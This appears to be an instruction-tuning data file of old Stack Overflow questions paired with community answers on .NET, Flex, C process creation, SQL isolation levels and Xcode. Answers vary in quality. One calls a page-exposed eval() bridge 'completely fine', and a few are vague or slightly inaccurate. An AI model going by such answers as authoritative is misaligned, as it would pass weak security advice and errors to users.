{"instruction": "There is a rich scripting model for Microsoft Office, but not so with Apple iWork, and specifically the word processor Pages. While there are some AppleScript hooks, it looks like the best approach is to manipulate the underlying XML data.\nThis turns out to be pretty ugly because (for example) page breaks are stored in XML. So for example, you have something like:\n... we hold these truths to be self evident, that </page>\n<page>all men are created equal, and are ...\n\nSo if you want to add or remove text, you have to move the start/end tags around based on the size of the text on the page. This is pretty impossible without computing the number of words a page can hold, which seems wildly inelegant.\nAnybody have any thoughts on this?", "output": "I'd suggest that modifying the underlying XML file is \"considered harmful\".  Especially if you haven't checked to see if the document is open!\nI've had a quick look at the Scripting Dictionary for Pages, and it seems pretty comprehensive; here is part of one entry:\n\ndocument\u2002n [inh. document > item; see also Standard Suite] : A Pages document.\nelements\ncontains captured pages, character\n  styles, charts, graphics, images,\n  lines, list styles, pages, paragraph\n  styles, sections, shapes, tables, text\n  boxes.\nproperties\nbody text (text) : The main text flow of the document.\nbottom margin (real) : The bottom margin of the publication.\nfacing pages (boolean) : Whether or not the view is set to facing\n  pages.\nfooter margin (real) : The footer margin of the publication.\nheader margin (real) : The header margin of the publication.\nid (integer, r/o) : The unique identifier of the document.\n...\n\nSo, I guess I'd want to know what it is that you want to do that you can't do with AppleScript?"}
{"instruction": "By default each row of a Gridview maps to each row in a datatable or dataset attached to its datasource. But what if I want to display these rows in multiple columns. For example if it has 10 rows, 5 rows each should be displayed in 2 columns side by side. Also can I do this with the Infragistics grid. Is this possible?", "output": "You can use a DataList control instead. It has a RepeatColumns property that you can define the number of columns you want to display.\nIn .NET Framework 3.5, there is an even better solution, the ListView control. You can find further information about how to use the ListView control here."}
{"instruction": "I need to read from Outlook .MSG file in .NET without using COM API for Outlook (cos it will not be installed on the machines that my app will run). Are there any free 3rd party libraries to do that? I want to extract From, To, CC and BCC fields. Sent/Receive date fields would be good if they are also stored in MSG files.", "output": "Update: I have found a 3rd party COM library called Outlook Redemption which is working fine for me at the moment. If you use it via COM-Interop in .NET, don't forget to release every COM object after you are done with it, otherwise your application crashes randomly."}
{"instruction": "What is the best way to manage a list of windows (keeping them in order) to be able to promote the next window to the top-level when the current top-level window is closed.\nThis is for a web application, so we're using jQuery Javascript.\nWe'd talked through a few simplistic solutions, such as using an array and just treating [0] index as the top-most window.\nI'm wondering if there's any potentially more efficient or useful alternative to what we had brainstormed.", "output": "I don't really know javascript, but couldn't you create a stack of windows?"}
{"instruction": "What is the best way to manage a list of windows (keeping them in order) to be able to promote the next window to the top-level when the current top-level window is closed.\nThis is for a web application, so we're using jQuery Javascript.\nWe'd talked through a few simplistic solutions, such as using an array and just treating [0] index as the top-most window.\nI'm wondering if there's any potentially more efficient or useful alternative to what we had brainstormed.", "output": "A stack if you want to just close the window on top.\nA queue if you also need to open windows at the end."}
{"instruction": "What's the simplest way to connect and query a database for a set of records in C#?", "output": "If you are querying a SQL Server database (Version 7 and up) you should replace the OleDb classes with corresponding classes in the System.Data.SqlClient namespace (SqlConnection, SqlCommand and SqlDataReader) as those classes have been optimized to work with SQL Server.\nAnother thing to note is that you should 'never' select all as this might lead to unexpected results later on if you add or remove columns to this table."}
{"instruction": "Thinking about getting into .net technology project management\nI've had plenty of experience with PHP projects: I'm aware of most of the existing frameworks and libraries, and I've written specs and case studies based on this knowledge.\nWhat should I know about .net?\nWhich top resources would you recommend me to know so I can rapidly learn and later stay up to date on the technology?\nEdit (8.24.08): The answers I got so far essentially discuss being a good PM. Thanks, but this is not what I meant. Any .net essentials would be appreciated.", "output": "Start with the basics before you get to the higher level stuff like web services (though that is important too). The most important things you need to learn, as a project manager, are the things you're going to be questioning your underlings about later. For example, my PM (also a PHP guy) has absolutely no knowledge of garbage collection and its implications, which makes it incredibly difficult for me to explain to him why our .NET Windows service appears to be taking 80MB of RAM.\nRemember, you are not the one who needs to know everything. You should be issuing overarching directives, and let the people with the expertise sort out the details. That said, study up on the technicals a bit so that they can communicate effectively with you.\nEdit (8/24/08):You should know something about the underlying technicals; not necessarily all .NET stuff either (garbage collection, .config files, pipes and services if you're running services adjacent to your project's main focus, stuff like that). Higher-reaching concepts would probably include WPF (maybe Silverlight as well), LINQ (or your ORM of choice), as well as the Vista bridge and related bridging code if your project includes desktop apps at all. Those three things seem to be the focus for this round of .NET. Something else that's very important to have at least a passing knowledge of is the ways that .NET code can/must interoperate with native code: P/Invoke, Runtime Callable Wrapping and COM Callable Wrapping. There are still a lot of native things that don't have a .NET equivalent.\nAs for resources, I'd highly recommend MSDN Magazine. They tend to preview upcoming technologies and tools well before average developers will ever see them."}
{"instruction": "Thinking about getting into .net technology project management\nI've had plenty of experience with PHP projects: I'm aware of most of the existing frameworks and libraries, and I've written specs and case studies based on this knowledge.\nWhat should I know about .net?\nWhich top resources would you recommend me to know so I can rapidly learn and later stay up to date on the technology?\nEdit (8.24.08): The answers I got so far essentially discuss being a good PM. Thanks, but this is not what I meant. Any .net essentials would be appreciated.", "output": "The biggest thing you'll probably want to learn is the differences between Windows and non-Windows programmers.  They approach fundamental things differently.  Knowing the difference will be key to successfully managing the project.  If you listen to the stack overflow podcast, and Jeff and Joel have multiple discussions on this topic.  Understanding the details of the underlying technology is mostly irrelevant and you'll never know it well enough to go toe to toe with someone who works in it day in and day out.  You can probably pick it up as you go."}
{"instruction": "Thinking about getting into .net technology project management\nI've had plenty of experience with PHP projects: I'm aware of most of the existing frameworks and libraries, and I've written specs and case studies based on this knowledge.\nWhat should I know about .net?\nWhich top resources would you recommend me to know so I can rapidly learn and later stay up to date on the technology?\nEdit (8.24.08): The answers I got so far essentially discuss being a good PM. Thanks, but this is not what I meant. Any .net essentials would be appreciated.", "output": "The #1 thing you need to be aware of (and I'm guessing you probably already are) is that the guys doing the coding should know what they are doing.  Depending on the personailties of the members of your team, you should be able to find someone who is willing and able to explain any of the intricacies to you on an as-required basis.\nIn my experience, the biggest hinderence to a project is the PM who understands the project, but not how to accomplish it (not in itself a problem), but who is also unwilling to listen to what his team tell him.  As with any project management, accept that you can't know everything, and be humble enough to ask for explanations where needed."}
{"instruction": "Thinking about getting into .net technology project management\nI've had plenty of experience with PHP projects: I'm aware of most of the existing frameworks and libraries, and I've written specs and case studies based on this knowledge.\nWhat should I know about .net?\nWhich top resources would you recommend me to know so I can rapidly learn and later stay up to date on the technology?\nEdit (8.24.08): The answers I got so far essentially discuss being a good PM. Thanks, but this is not what I meant. Any .net essentials would be appreciated.", "output": "The number one rule is do NOT just ask for status updates.  It is Especially annoying when phrases like \"where are we on this?\" are used.   If you aren't directly involved in the details then just make sure you have established communication times or plans so that you know whats going on rather than asking for updates."}
{"instruction": "What is the best way to manage a list of windows (keeping them in order) to be able to promote the next window to the top-level when the current top-level window is closed.\nThis is for a web application, so we're using jQuery Javascript.\nWe'd talked through a few simplistic solutions, such as using an array and just treating [0] index as the top-most window.\nI'm wondering if there's any potentially more efficient or useful alternative to what we had brainstormed.", "output": "Stack/queue in JS is a simple array, which can be manipulated with .push(val), .pop(), .shift(val) and .unshift()."}
{"instruction": "I'd like to take some RTF input and clean it to remove all RTF formatting except \\ul \\b \\i to paste it into Word with minor format information.\nThe command used to paste into Word will be something like:\noWord.ActiveDocument.ActiveWindow.Selection.PasteAndFormat(0) (with some RTF text already in the Clipboard)\n{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fnil\\fcharset0 Courier New;}}\n{\\colortbl ;\\red255\\green255\\blue140;}\n\\viewkind4\\uc1\\pard\\highlight1\\lang3084\\f0\\fs18 The company is a global leader in responsible tourism and was \\ul the first major hotel chain in North America\\ulnone  to embrace environmental stewardship within its daily operations\\highlight0\\par\n\nDo you have any idea on how I can clean up the RTF safely with some regular expressions or something? I am using VB.NET to do the processing but any .NET language sample will do.", "output": "You can strip out the tags with regular expressions.  Just make sure that your expressions will not filter tags that were actually text.  If the text had \"\\b\" in the body of text, it would appear as \\b in the RTF stream.   In other words, you would match on \"\\b\" but not \"\\b\".\nYou could probably take a short cut and filter out the header RTF tags.  Look for the first occurrence of \"\\viewkind4\" in the input.  Then read ahead to the first space character.  You would remove all of the characters from the start of the text up to and including that space character.  That would strip out the RTF header information (fonts, colors, etc)."}
{"instruction": "I have a flex application that needs the ability to generate and execute JavaScript. When I say this, I mean I need to execute raw JavaScript that I create in my Flex application (not just an existing JavaScript method)\nI am currently doing this by exposing the following JavaScript method:\nfunction doScript(js){ eval(js);}\n\nI can then do something like this in Flex (note: I am doing something more substantial then an alert box in the real Flex app):\nExternalInterface.call(\"doScript\",\"alert('foo'));\n\nMy question is does this impose any security risk, I am assuming it's not since the Flex and JasvaScript all run client side...\nIs there a better way to do this?", "output": "As far as I know, and I'm definately not a hacker, you are completely fine. Really, if someone wanted to, they could exploit your code anyway clientside, but i don't see how they could exploit your server side code using javascript (unless you use server side javascript)"}
{"instruction": "I have a flex application that needs the ability to generate and execute JavaScript. When I say this, I mean I need to execute raw JavaScript that I create in my Flex application (not just an existing JavaScript method)\nI am currently doing this by exposing the following JavaScript method:\nfunction doScript(js){ eval(js);}\n\nI can then do something like this in Flex (note: I am doing something more substantial then an alert box in the real Flex app):\nExternalInterface.call(\"doScript\",\"alert('foo'));\n\nMy question is does this impose any security risk, I am assuming it's not since the Flex and JasvaScript all run client side...\nIs there a better way to do this?", "output": "I don't see where this lets them do anything that they couldn't do already by calling eval.  If there's a security hole being introduced here, I don't see it."}
{"instruction": "I have a flex application that needs the ability to generate and execute JavaScript. When I say this, I mean I need to execute raw JavaScript that I create in my Flex application (not just an existing JavaScript method)\nI am currently doing this by exposing the following JavaScript method:\nfunction doScript(js){ eval(js);}\n\nI can then do something like this in Flex (note: I am doing something more substantial then an alert box in the real Flex app):\nExternalInterface.call(\"doScript\",\"alert('foo'));\n\nMy question is does this impose any security risk, I am assuming it's not since the Flex and JasvaScript all run client side...\nIs there a better way to do this?", "output": "This isn't inherently dangerous, but the moment you pass any user-provided data into the function, it's ripe for a code injection exploit. That's worrisome, and something I'd avoid. I think a better approach would be to only expose the functionality you need, and nothing more."}
{"instruction": "I'd like to take some RTF input and clean it to remove all RTF formatting except \\ul \\b \\i to paste it into Word with minor format information.\nThe command used to paste into Word will be something like:\noWord.ActiveDocument.ActiveWindow.Selection.PasteAndFormat(0) (with some RTF text already in the Clipboard)\n{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fnil\\fcharset0 Courier New;}}\n{\\colortbl ;\\red255\\green255\\blue140;}\n\\viewkind4\\uc1\\pard\\highlight1\\lang3084\\f0\\fs18 The company is a global leader in responsible tourism and was \\ul the first major hotel chain in North America\\ulnone  to embrace environmental stewardship within its daily operations\\highlight0\\par\n\nDo you have any idea on how I can clean up the RTF safely with some regular expressions or something? I am using VB.NET to do the processing but any .NET language sample will do.", "output": "I would use a hidden RichTextBox, set the Rtf member, then retrieve the Text member to sanitize the RTF in a well-supported way.  Then I would use manually inject the desired formatting afterwards."}
{"instruction": "I have a flex application that needs the ability to generate and execute JavaScript. When I say this, I mean I need to execute raw JavaScript that I create in my Flex application (not just an existing JavaScript method)\nI am currently doing this by exposing the following JavaScript method:\nfunction doScript(js){ eval(js);}\n\nI can then do something like this in Flex (note: I am doing something more substantial then an alert box in the real Flex app):\nExternalInterface.call(\"doScript\",\"alert('foo'));\n\nMy question is does this impose any security risk, I am assuming it's not since the Flex and JasvaScript all run client side...\nIs there a better way to do this?", "output": "There's no need for the JavaScript function, the first argument to ExternalInterface can be any JavaScript code, it doesn't have to be a function name (the documentation says so, but it is wrong).\nTry this:\nExternalInterface.call(\"alert('hello')\");"}
{"instruction": "I'd like to take some RTF input and clean it to remove all RTF formatting except \\ul \\b \\i to paste it into Word with minor format information.\nThe command used to paste into Word will be something like:\noWord.ActiveDocument.ActiveWindow.Selection.PasteAndFormat(0) (with some RTF text already in the Clipboard)\n{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fnil\\fcharset0 Courier New;}}\n{\\colortbl ;\\red255\\green255\\blue140;}\n\\viewkind4\\uc1\\pard\\highlight1\\lang3084\\f0\\fs18 The company is a global leader in responsible tourism and was \\ul the first major hotel chain in North America\\ulnone  to embrace environmental stewardship within its daily operations\\highlight0\\par\n\nDo you have any idea on how I can clean up the RTF safely with some regular expressions or something? I am using VB.NET to do the processing but any .NET language sample will do.", "output": "I'd do something like the following:\nDim unformatedtext As String\n\nsomeRTFtext = Replace(someRTFtext, \"\\ul\", \"[ul]\")\nsomeRTFtext = Replace(someRTFtext, \"\\b\", \"[b]\")\nsomeRTFtext = Replace(someRTFtext, \"\\i\", \"[i]\")\n\nDim RTFConvert As RichTextBox = New RichTextBox\nRTFConvert.Rtf = someRTFtext\nunformatedtext = RTFConvert.Text\n\nunformatedtext = Replace(unformatedtext, \"[ul]\", \"\\ul\")\nunformatedtext = Replace(unformatedtext, \"[b]\", \"\\b\")\nunformatedtext = Replace(unformatedtext, \"[i]\", \"\\i\")\n\nClipboard.SetText(unformatedtext)\n\noWord.ActiveDocument.ActiveWindow.Selection.PasteAndFormat(0)"}
{"instruction": "I need to read from Outlook .MSG file in .NET without using COM API for Outlook (cos it will not be installed on the machines that my app will run). Are there any free 3rd party libraries to do that? I want to extract From, To, CC and BCC fields. Sent/Receive date fields would be good if they are also stored in MSG files.", "output": "It's a \"Structured Storage\" document. I've successfully used Andrew Peace's code to read these in the past, even under .NET (using C++/CLI) - it's clean and fairly easy to understand. Basically, you need to figure out which records you need, and query for those - it gets a little bit hairy, since different versions of Outlook and different types of messages will result in different records..."}
{"instruction": "How do you run an external program and pass it command line parameters using C? If you have to use operating system API, include a solution for Windows, Mac, and Linux.", "output": "It really depends on what you're trying to do, exactly, as it's:\n\nOS dependent\nNot quite clear what you're trying to do.\n\nNevertheless, I'll try to provide some information for you to decide.\nOn UNIX, fork() creates a clone of your process from the place where you called fork. Meaning, if I have the following process:\n#include <unistd.h>\n#include <stdio.h>\n\nint main()\n{\n    printf( \"hi 2 u\\n\" );\n    int mypid = fork();\n\n    if( 0 == mypid )\n        printf( \"lol child\\n\" );\n    else\n        printf( \"lol parent\\n\" );\n\n    return( 0 );\n}\n\nThe output will look as follows:\n\n\nhi 2 u\n    lol child\n    lol parent  \n\n\nWhen you fork() the pid returned in the child is 0, and the pid returned in the parent is the child's pid. Notice that \"hi2u\" is only printed once... by the parent.\nexecve() and its family of functions are almost always used with fork(). execve() and the like overwrite the current stackframe with the name of the application you pass to it. execve() is almost always used with fork() where you fork a child process and if you're the parent you do whatever you need to keep doing and if you're the child you exec a new process. execve() is also almost always used with waitpid() -- waitpid takes a pid of a child process and, quite literally, waits until the child terminates and returns the child's exit status to you.  \nUsing this information, you should be able to write a very basic shell; one that takes process names on the command line and runs processes you tell it to. Of course, shells do more than that, like piping input and output, but you should be able to accomplish the basics using fork(), execve() and waitpid().\nNOTE: This is *nix specific! This will NOT work on Windows. \nHope this helped."}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "We use Watin at my place of employment, we are a .net shop so this solution made a lot of sense.  We actually started with Watir (the original ruby implementation) and switched after.  It's been a pretty good solution for us so far"}
{"instruction": "Why should I or shouldn't I use dirty reads:\nset transaction isolation level read uncommitted\n\nin SQL Server?", "output": "Generally when you need to do a sizeable (or frequent) queries to busy tables, where read committed would possibly be blocked by locks from uncommited transactions, but ONLY when you can live with inaccurate data. \nAs an example, on a gaming web site I worked on recently there was a summary display of some stats about recent games, this was all based on dirty reads, it was more important for us to include then exclude the transactional data not yet committed (we knew anyway that few, if any, transactions would be backed out), we felt that on average the data would be more accurate that way."}
{"instruction": "Why should I or shouldn't I use dirty reads:\nset transaction isolation level read uncommitted\n\nin SQL Server?", "output": "use it if you want the data back right away and it is not that important if it is right\ndo not use if if the data is important to be correct or if you are doing updates with it\nAlso take a look at snapshot isolation which has been introduced in sql server 2005"}
{"instruction": "Why should I or shouldn't I use dirty reads:\nset transaction isolation level read uncommitted\n\nin SQL Server?", "output": "From MSDN:\n\nWhen this option is set, it is possible to read uncommitted or dirty data; values in the data can be changed and rows can appear or disappear in the data set before the end of the transaction. \n\nSimply put, when you are using this isolation level, and you are performing multiple queries on an active table as part of one transaction, there is no guarantee that the information returned to you within different parts of the transaction will remain the same. You could query the same data twice within one transaction and get different results (this might happen in the case where a different user was updating the same data in the midst of your transaction). This can obviously have severe ramifications for parts of your application that rely on data integrity."}
{"instruction": "I have a Java swing application with a panel that contains three JComboBoxes that do not draw properly.\nThe combox boxes just show up as the down arrow on the right side, but without the label of the currently selected value.\nThe boxes will redraw correctly if the window is resized either bigger or smaller by even one pixel.\nAll of my googling has pointed to calling revalidate() on the JPanel to fix this, but that hasn't worked for me.\nCalling updateUI() on the JPanel has changed it from always displaying incorrectly to displaying incorrectly half of the time.  \nHas anyone else seen this and found a different way to force a redraw of the combo boxes?", "output": "Can you give us some more information on how you add the combo boxes to the JPanel?  This is a pretty common thing to do in Swing so I doubt that it's a JVM issue but I guess anything is possible.\nSpecifically, I would double check to make sure you're not accessing the GUI from any background threads.  In this case, maybe you're reading the choices from a DB or something and updating the JComboBox from a background thread, which is a big no-no in Swing.  See SwingUtils.invokeLater()."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "The problem with Silverlight, is that there's still a lot of people who don't have it installed.  Also, I\"m not sure how well your existing .Net developers will be able to leverage their existing skills if they are only familiar with more traditional server-side .Net coding. \nWhat are your reasons for pushing Silverlight over Flex? If you have to ask the SOFlow community for reasons, it seems odd that you would be so willing to push it."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "I think Silverlight and XAML is preferable to ActionScript, and though I'm not familiar with ActionScript IDE's, I am familiar with VS2008 and Expression Web/Blend, and they are very good development environments and getting better all the time.  I would go with Silverlight, and I think the key to getting users to install the plug-in is to have a good plug-in detect page that explains what SL is and why they need it.  For an example of this, go to http://memorabilia.hardrock.com/ and try it with your SL plug-in disabled."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "As Kibbee hinted at above, the argument of leveraging existing .Net developers doesn't hold much water.  It is impossible to be an expert in all facets of .Net development.  The platform is just too big.  The same goes for Java.  The only thing Silverlight has going for it from a skills perspective is that you can code in your favorite .Net language.  That advantage is fairly small if you are already doing any significant web development that utilizes JavaScript since Action script is a variation.  So really to convert a programmer to either Flex or Silverlight is all about learning the platform's API."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "I think Silverlight is most advantageous for companies that have .NET developers but noone with designer experience.\nSkill sets will be easier to find as far as finding C# or VB developers vs finding ActionScript guru's.  However there is the trade off:\nDesign experience is an investment not only in Designers with artistic skill, but also in the knowledge and tools provided by Adobe.  You can nearly guarantee that a professional designer uses a mac and has experience with Adobe tools.\nRight now the Silverlight designer tools are half baked and can be a headache.  For instance Blend errors when trying to render any xaml containing an IValueConverter, this is problematic.  I have no idea what the Adobe developer experience is, I'm sure it is as hairy.\nSo at this stage of the game it comes down to human resources:  \nIf you have .NET experience and little invested in Design skills go Silverlight. Programming skills/tools will be transferable.\nIf you have Design experience and skill set go with Flex.  Designer skills/tools will be transferable.\nEither way both client platforms require communication with services to get data, so you will always leverage your existing programing expertise on the back end. \nParaphrased Jon's opinion from a different point of view:\nI think you should look at Flex as a long-term play, just as Adobe seems to be doing. There's an obvious balance on when to use Silverlight vs. Flex when you're concerned about reach and install base, but here are more reasons Flex is a good direction to move in:\n\nSecond mover advantage - Just as\nAdobe built a \"better Java Applet\"\nwith Flash, they're able to look at\nhow you'd design a runtime from\nscratch, today. They have the\nadvantage of knowing how people use\nthe web today, something the\ninventors of existing client\nplatforms could never have\naccurately guessed. .NET can add\nfeatures, but they can't\nrealistically chuck the platform and\nstart over.\nDesigner familiarity - While\nFlex/AIR is a new programing model,\nit's not entirely unfamiliar to\ndesigners. They'll \"get\" the way\nFlex works a lot more quickly than\nthey'll understand firing up a new\ndesign environment with new feature\npoor tools and new animation\nparadigms.\nBeing rid of the RGB color model in\nSilverlight- .NET was originally\nbuilt for windows and it is at the\ncore of how it works. Flex ditched a\nlong time ago for an design-centric\nmodel.\nAll your tools run on your mac. Nuff\nsaid.\nCool features - Silverlight still\nhas some catching up to do with\nFlash on some obvious features (like\nwebcam / mic integration, or 3d /\ngraphics acceleration)."}
{"instruction": "I'm a complete Xcode/Objective-C/Cocoa newbie but I'm learning fast and really starting to enjoy getting to grips with a new language, platform and paradigm.\nOne thing is though, having been using Visual Studio with R# for so long I've kind of been spoiled with the coding tools such as refactorings and completion etc and as far as I can tell Xcode has some fairly limited built in support for this stuff.\nOn that note, does anyone know if any add-ins or whatever are available for the Xcode environment which add coding helpers such as automatically generating implementation skeletons from a class interface definition etc? \nI suspect there aren't but I suppose it can't help to ask.", "output": "Xcode has refactoring for C and Objective-C built in.  Just select what you'd like to refactor, choose \"Refactor...\" from either the menu bar or the contextual menu, and you'll get a window including the available refactorings and a preview area.\nXcode doesn't currently have a public plug-in API; if there are specific types of plug-ins you'd like Apple to enable, file enhancement requests in the Bug Reporter.  That way Apple can count and track such requests.\nHowever, there are third-party tools like Accessorizer and mogenerator (the latest release is mogenerator 1.10) that you can use to make various development tasks faster.  Accessorizer helps you create accessor methods for your classes, while mogenerator does more advanced code generation for Core Data managed object classes that are modeled using Xcode's modeling tools."}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "I think you should look at Silverlight as a long-term play, just as Microsoft seems to be doing. There's an obvious balance on when to use Silverlight vs. Flash when you're concerned about reach and install base, but here are some reasons Silverlight is a good direction to move in:\n\nSecond mover advantage - Just as Microsoft built a \"better Java\" with .NET, they're able to look at how you'd design a RIA plugin from scratch, today. They have the advantage of knowing how people use the web today, something the inventors of Flash could never have accurately guessed. Flash can add features, but they can't realistically chuck the platform and start over.\nDeveloper familiarity - While Silverlight is a new model, it's not entirely unfamiliar to developers. They'll \"get\" the way Silverlight works a lot more quickly than they'll understand firing up a new development environment with a new scripting language and new event paradigms.\nBeing rid of the timeline model in Flash - Flash was originally built for keyframe based animations, and while there are ways to abstract this away, it's at the core of how Flash works. Silverlight ditches that for an application-centric model. \nScottGu - ScottGu is fired up about Silverlight. Nuff said.\nCool new features - While Silverlight still has some catching up to do with Flash on some obvious features (like webcam / mic integration, or 3d / graphics acceleration), there are some slick new technologies built in to Silverlight - Deep Zoom is one example. I'm seeing more \"revolutionary\" technologies on the Silverlight side, while Flash seems to be in maintenance mode at this point."}
{"instruction": "I'm tired of being in the middle of typing something, having a pop-up with a question appear, and hitting enter before reading it... (it also happens with some windows that are not pop-ups)\nDo you know if there's some setting I could touch for this not to happen?", "output": "Not that I know of. This has been a plague of Windows versions for quite some time."}
{"instruction": "I'm a bit newbieish when it comes to the deeper parts of OSX configuration and am having to put up with a fairly irritating niggle which while I can put up with it, I know under Windows I could have sorted in minutes.\nBasically, I have an external disk with two volumes: \nOne is an HFS+ volume which I use for TimeMachine backups.\nThe other, an NTFS volume that I use for general file copying etc on Mac and Windows boxes.\nSo what happens is that whenever I plug in the disk into my Mac USB, OSX goes off and mounts both volumes and shows an icon on the desktop for each. The thing is that to remove the disk you have to eject the volume and in this case do it for both volumes, which causes an annoying warning dialog to be shown every time. \nWhat I'd prefer is some way to prevent the NTFS volume from auto-mounting altogether. I've done some hefty googling and here's a list of things I've tried so far:\n\nI've tried going through options in Disk Utility\nI've tried setting AutoMount to No in /etc/hostconfig but that is a bit too global for my liking.\nI've also tried the suggested approach to putting settings in fstab but it appears the OSX (10.5) is ignoring these settings.\n\nAny other suggestions would be welcomed. Just a little dissapointed that I can't just tick a box somewhere (or untick).\nEDIT: Thanks heaps to hop for the answer it worked a treat. For the record it turns out that it wasn't OSX not picking up the settings I actually had \"msdos\" instead of \"ntfs\" in the fs type column.", "output": "This is not directly an answer, but\n\nThe thing is that to remove the disk you have to eject the volume and in this case do it for both volumes\n\nI have a similar situation.\nOSX remembers where you put your icons on the desktop - I've moved the icons for both of my removable drives to just above where the trash can lives.\nEject procedure becomes\n\nHit top-left of screen with mouse to show desktop\nDrag small box around both removable drives\nDrag 2cm onto trash so they both get ejected\nRemove firewire cable"}
{"instruction": "I'm a complete Xcode/Objective-C/Cocoa newbie but I'm learning fast and really starting to enjoy getting to grips with a new language, platform and paradigm.\nOne thing is though, having been using Visual Studio with R# for so long I've kind of been spoiled with the coding tools such as refactorings and completion etc and as far as I can tell Xcode has some fairly limited built in support for this stuff.\nOn that note, does anyone know if any add-ins or whatever are available for the Xcode environment which add coding helpers such as automatically generating implementation skeletons from a class interface definition etc? \nI suspect there aren't but I suppose it can't help to ask.", "output": "You sound as if you're looking for three major things: code templates, refactoring tools, and auto-completion.\nThe good news is that Xcode 3 and later come with superb auto-completion and template support.  By default, you have to explicitly request completion by hitting the escape key.  (This actually works in all NSTextViews; try it!)  If you want to have the completions appear automatically, you can go to Preferences -> Code Sense and set the pop-up to appear automatically after a few seconds.  You should find good completions for C and Objective-C code, and pretty good completions for C++.\nXcode also has a solid template/skeleton system that you can use.  You can see what templates are available by default by going to Edit -> Insert Text Macro.  Of course, you don't want to insert text macros with the mouse; that defeats the point.  Instead, you have two options:\n\nBack in Preferences,go to Key Bindings, and then, under Menu Key Bindings, assign a specific shortcut to macros you use often.  I personally don't bother doing this, but I know plenty of great Mac devs who do\nUse the CompletionPrefix.  By default, nearly all of the templates have a special prefix that, if you type and then hit the escape key, will result in the template being inserted.  You can use Control-/ to move between the completion fields.\nYou can see a full list of Xcode's default macros and their associated CompletionPrefixes at Crooked Spin.\nYou can also add your own macros, or modify the defaults.  To do so, edit the file /Developer/Library/Xcode/Specifications/{C,HTML}.xctxtmacro.  The syntax should be self-explanatory, if not terribly friendly.\n\nUnfortunately, if you're addicted to R#, you will be disappointed by your refactoring options.  Basic refactoring is provided within Xcode through the context menu or by hitting Shift-Apple-J.  From there, you can extract and rename methods, promote and demote them through the class hierarchy, and a few other common operations.  Unfortunately, neither Xcode nor any third-party utilities offer anything approaching Resharper, so on that front, you're currently out of luck.  Thankfully, Apple has already demonstrated versions of Xcode in the works that have vastly improved refactoring capabilities, so hopefully you won't have to wait too long before the situation starts to improve."}
